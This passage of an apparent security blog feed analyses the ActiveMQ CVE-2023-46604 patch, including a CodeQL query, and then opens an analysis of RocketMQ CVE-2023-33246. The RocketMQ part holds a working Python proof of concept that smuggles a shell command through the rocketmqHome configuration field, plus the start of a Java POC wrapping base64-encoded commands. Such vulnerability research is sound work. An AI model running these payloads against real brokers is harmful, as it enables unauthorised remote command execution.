class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">checkSecurity</span><span class="params">(Class clazz)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (trustAllPackages() || clazz.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">found</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">Package</span> <span class="variable">thePackage</span> <span class="operator">=</span> clazz.getPackage();</span><br><span class="line">    <span class="keyword">if</span> (thePackage != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (String trustedPackage : getTrustedPackages()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (thePackage.getName().equals(trustedPackage) || thePackage.getName().startsWith(trustedPackage + <span class="string">&quot;.&quot;</span>)) &#123;</span><br><span class="line">                found = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(<span class="string">&quot;Forbidden &quot;</span> + clazz + <span class="string">&quot;! This class is not trusted to be serialized as ObjectMessage payload. Please take a look at http://activemq.apache.org/objectmessage.html for more information on how to configure trusted classes.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="SubSelectorClassObjectInputStream"><a href="#SubSelectorClassObjectInputStream" class="headerlink" title="SubSelectorClassObjectInputStream"></a>SubSelectorClassObjectInputStream</h5><p>SubQueueSelectorCacheBroker</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SubSelectorClassObjectInputStream</span> <span class="keyword">extends</span> <span class="title class_">ObjectInputStream</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SubSelectorClassObjectInputStream</span><span class="params">(InputStream is)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(desc.getName().startsWith(<span class="string">&quot;java.lang.&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;com.thoughtworks.xstream&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;java.util.&quot;</span>)</span><br><span class="line">                || desc.getName().length() &gt; <span class="number">2</span> &amp;&amp; desc.getName().substring(<span class="number">2</span>).startsWith(<span class="string">&quot;java.util.&quot;</span>) <span class="comment">// Allow arrays</span></span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;org.apache.activemq.&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-1-2-Object"><a href="#4-2-1-2-Object" class="headerlink" title="4.2.1.2 Object"></a>4.2.1.2 Object</h4><h5 id="ActiveMQObjectMessage"><a href="#ActiveMQObjectMessage" class="headerlink" title="ActiveMQObjectMessage"></a>ActiveMQObjectMessage</h5><p>ActiveMQObjectMessage.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActiveMQObjectMessage</span> <span class="keyword">extends</span> <span class="title class_">ActiveMQMessage</span> <span class="keyword">implements</span> <span class="title class_">ObjectMessage</span>, TransientInitializer &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> List&lt;String&gt; trustedPackages = Arrays.asList(ClassLoadingAwareObjectInputStream.serializablePackages);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">boolean</span> <span class="variable">trustAllPackages</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Serializable object;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Serializable <span class="title function_">deserialize</span><span class="params">(ByteSequence content)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    <span class="type">Serializable</span> <span class="variable">object</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (content != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(content);</span><br><span class="line">            <span class="keyword">if</span> (isCompressed()) &#123;</span><br><span class="line">                is = <span class="keyword">new</span> <span class="title class_">InflaterInputStream</span>(is);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">dataIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(is);</span><br><span class="line">            <span class="type">ClassLoadingAwareObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoadingAwareObjectInputStream</span>(dataIn);</span><br><span class="line">            objIn.setTrustedPackages(trustedPackages);</span><br><span class="line">            objIn.setTrustAllPackages(trustAllPackages);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                object = (Serializable)objIn.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException ce) &#123;</span><br><span class="line">                <span class="keyword">throw</span> JMSExceptionSupport.create(<span class="string">&quot;Failed to build body from content. Serializable class not available to broker. Reason: &quot;</span> + ce, ce);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                dataIn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> JMSExceptionSupport.create(<span class="string">&quot;Failed to build body from bytes. Reason: &quot;</span> + e, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTrustedPackages</span><span class="params">(List&lt;String&gt; trustedPackages)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.trustedPackages = trustedPackages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isTrustAllPackages</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> trustAllPackages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTrustAllPackages</span><span class="params">(<span class="type">boolean</span> trustAllPackages)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.trustAllPackages = trustAllPackages;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="ActiveMQStreamMessage"><a href="#ActiveMQStreamMessage" class="headerlink" title="ActiveMQStreamMessage"></a>ActiveMQStreamMessage</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    initializeReading();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataIn.mark(<span class="number">65</span>);</span><br><span class="line">        <span class="keyword">if</span> (type == -<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.dataIn.reset();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MessageFormatException</span>(<span class="string">&quot;unknown type&quot;</span>);</span><br><span class="line">        &#125;            </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkWriteOnlyBody();</span><br><span class="line">    <span class="built_in">this</span>.checkBytesInFlight();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.facade.peek();</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        result = <span class="literal">null</span>;</span><br><span class="line">    ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> <span class="type">byte</span>[])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MessageFormatException</span>(<span class="string">&quot;Unknown type found in stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] original = (<span class="type">byte</span>[])value;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="title class_">byte</span>[original.length];</span><br><span class="line">        System.arraycopy(original, <span class="number">0</span>, result, <span class="number">0</span>, original.length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>基本都封死了。</p><!-- ## 4.3 新漏洞挖掘![upload successful](/images/pasted-711.png)- 此刻message.object 还为null- message ActiveMQObjectMessage#toString 可以触发toString类型的反序列化剩下的只是找toString触发即可![upload successful](/images/pasted-810.png)![upload successful](/images/pasted-811.png)--><h1 id="0x05-CodeQL回归验证"><a href="#0x05-CodeQL回归验证" class="headerlink" title="0x05 CodeQL回归验证"></a>0x05 CodeQL回归验证</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> NewInstanceConfigFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class="line"> </span><br><span class="line"><span class="keyword">module</span> NewInstanceConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">10</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    source <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">        ma.getArgument(<span class="number">0</span>) = sink.asExpr()</span><br><span class="line">      | </span><br><span class="line">        ma.getMethod().hasName(<span class="string">&quot;newInstance&quot;</span>) and</span><br><span class="line">        ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang.reflect&quot;</span>, <span class="string">&quot;Constructor&lt;&gt;&quot;</span>)</span><br><span class="line">      )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> NewClassConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">10</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    source <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">        ma.getArgument(<span class="number">0</span>) = sink.asExpr()</span><br><span class="line">      | </span><br><span class="line">        ma.getMethod().hasName(<span class="string">&quot;forName&quot;</span>)</span><br><span class="line">        and ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Class&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> Class2ConstructorConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">10</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">      ma.getArgument(<span class="number">0</span>) = source.asExpr()</span><br><span class="line">    | </span><br><span class="line">      ma.getMethod().hasName(<span class="string">&quot;forName&quot;</span>)</span><br><span class="line">      and ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Class&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">      ma.getArgument(<span class="number">0</span>) = sink.asExpr()</span><br><span class="line">    | </span><br><span class="line">      ma.getMethod().hasName(<span class="string">&quot;newInstance&quot;</span>) and </span><br><span class="line">      ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang.reflect&quot;</span>, <span class="string">&quot;Constructor&lt;&gt;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isAdditionalFlowStep</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">      node1.asExpr() = ma.getQualifier() and </span><br><span class="line">      node2.asExpr() = ma.getArgument(<span class="number">0</span>)</span><br><span class="line">      |</span><br><span class="line">      ma.getMethod().hasName(<span class="string">&quot;newInstance&quot;</span>) and </span><br><span class="line">      ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang.reflect&quot;</span>, <span class="string">&quot;Constructor&lt;&gt;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">module</span> <span class="variable">NewInstanceConfigFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;NewInstanceConfig&gt;;</span><br><span class="line"><span class="type">module</span> <span class="variable">NewClassConfigFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;NewClassConfig&gt;;</span><br><span class="line"><span class="type">module</span> <span class="variable">Class2ConstructorConfigFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;Class2ConstructorConfig&gt;;</span><br><span class="line"></span><br><span class="line">from NewInstanceConfigFlow::PathNode source, NewInstanceConfigFlow::PathNode sink</span><br><span class="line">  , NewClassConfigFlow::PathNode source2, NewClassConfigFlow::PathNode sink2</span><br><span class="line">  , Class2ConstructorConfigFlow::PathNode source3, Class2ConstructorConfigFlow::PathNode sink3</span><br><span class="line">where NewInstanceConfigFlow::flowPath(source, sink)</span><br><span class="line">  and NewClassConfigFlow::flowPath(source2, sink2)</span><br><span class="line">  and Class2ConstructorConfigFlow::flowPath(source3, sink3)</span><br><span class="line">  and source.getNode() = source2.getNode()</span><br><span class="line">  and sink2.getNode() = source3.getNode()</span><br><span class="line">  and sink.getNode() = sink3.getNode()</span><br><span class="line">select sink, source, sink, <span class="string">&quot;$@ -&gt; $@&quot;</span>, source, source.toString()</span><br><span class="line">  , sink2, sink2.toString()</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-838.png" alt="upload successful"></p><h1 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h1><ol><li><a href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ActiveMQ 的RCE 漏洞，直接从61616 端口默认协议上可触发，影响不小。&lt;/p&gt;
&lt;p&gt;偷懒了当时只是验证了下没写分析，先在还得从头开始捡。&lt;/p&gt;
&lt;h1 id=&quot;0x01-补丁分析&quot;&gt;&lt;a href=&quot;#0x01-补丁分析&quot; class=&quot;headerlin</summary>
      
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
    <category term="ActiveMQ" scheme="http://m0d9.me/tags/ActiveMQ/"/>
    
    <category term="CVE-2023-46604" scheme="http://m0d9.me/tags/CVE-2023-46604/"/>
    
  </entry>
  
  <entry>
    <title>RocketMQ CVE-2023-33246/CVE-2023-37582 漏洞分析</title>
    <link href="http://m0d9.me/2023/08/14/RocketMQ-CVE-2023-33246-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2023/08/14/RocketMQ-CVE-2023-33246-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2023-08-14T06:32:00.000Z</published>
    <updated>2024-05-24T04:10:04.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-CVE-2023-33246"><a href="#0x01-CVE-2023-33246" class="headerlink" title="0x01 CVE-2023-33246"></a>0x01 CVE-2023-33246</h1><blockquote><p>漏洞描述<br>RocketMQ 5.1.0及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ的NameServer、Broker、Controller等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以RocketMQ运行的系统用户身份执行命令。 此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。</p></blockquote><blockquote><p>影响版本<br>5.0.0 &lt;= Apache RocketMQ &lt; 5.1.1<br>4.0.0 &lt;= Apache RocketMQ &lt; 4.9.6</p></blockquote><h2 id="1-1-环境搭建"><a href="#1-1-环境搭建" class="headerlink" title="1.1 环境搭建"></a>1.1 环境搭建</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim bin/runserver.sh</span><br><span class="line"># 增加DEBUG JAVA OPT</span><br><span class="line">JAVA_OPT=<span class="string">&quot;$&#123;JAVA_OPT&#125; -Xdebug -Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n&quot;</span></span><br><span class="line">vim bin/runbroker.sh</span><br><span class="line"># 增加DEBUG JAVA OPT</span><br><span class="line">JAVA_OPT=<span class="string">&quot;$&#123;JAVA_OPT&#125; -Xdebug -Xrunjdwp:transport=dt_socket,address=5006,server=y,suspend=n&quot;</span></span><br><span class="line"></span><br><span class="line">./mqbroker -n <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">9876</span></span><br><span class="line">./mqnamesrv</span><br></pre></td></tr></table></figure><h3 id="1-2-POC复现"><a href="#1-2-POC复现" class="headerlink" title="1.2 POC复现"></a>1.2 POC复现</h3><h3 id="1-2-1-POC"><a href="#1-2-1-POC" class="headerlink" title="1.2.1 POC"></a>1.2.1 POC</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">client = socket.socket()</span><br><span class="line">client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10911</span>))</span><br><span class="line"><span class="comment"># data</span></span><br><span class="line">json = <span class="string">&#x27;&#123;&quot;code&quot;:25,&quot;extFields&quot;:&#123;&quot;test&quot;:&quot;RockedtMQ&quot;&#125;,&quot;flag&quot;:0,&quot;language&quot;:&quot;JAVA&quot;,&quot;opaque&quot;:266,&quot;serializeTypeCurrentRPC&quot;:&quot;JSON&quot;,&quot;version&quot;:433&#125;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">cmd = <span class="string">&quot;-c $@| sh . echo echo &#x27;touch /tmp/success_rocketmq&#x27; | bash -i&quot;</span></span><br><span class="line">body=<span class="string">f&#x27;filterServerNums=1\nnamesrvAddr=127.0.0.1:9876\nrocketmqHome=<span class="subst">&#123;cmd&#125;</span>&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json_lens = int(len(binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>)</span><br><span class="line">head1 = <span class="string">&#x27;00000000&#x27;</span>+str(hex(json_lens))[<span class="number">2</span>:]</span><br><span class="line">all_lens = int(<span class="number">4</span>+len(binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>))/<span class="number">2</span>+json_lens)</span><br><span class="line">head2 = <span class="string">&#x27;00000000&#x27;</span>+str(hex(all_lens))[<span class="number">2</span>:]</span><br><span class="line">data = head2[<span class="number">-8</span>:]+head1[<span class="number">-8</span>:]+binascii.hexlify(json).decode(<span class="string">&#x27;utf-8&#x27;</span>)+binascii.hexlify(body).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># send</span></span><br><span class="line">client.send(bytes.fromhex(data))</span><br><span class="line">data_recv = client.recv(<span class="number">1024</span>)</span><br><span class="line">print(data_recv)</span><br></pre></td></tr></table></figure><h4 id="1-2-2-疑问POC"><a href="#1-2-2-疑问POC" class="headerlink" title="1.2.2 疑问POC"></a>1.2.2 疑问POC</h4><p>参考【1】中的POC，执行总是会报错connect to 127.0.0.1:10911 failed，Google反馈的大都是配置broker，但是实际测试仍然报错。</p><blockquote><p>TODO: 分析原因</p></blockquote><a id="more"></a><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> org.apache.rocketmq.tools.admin.DefaultMQAdminExt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;-c $@|sh . echo echo \&quot;&quot;</span> + cmdBase + <span class="string">&quot;\&quot;|base64 -d|bash -i;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 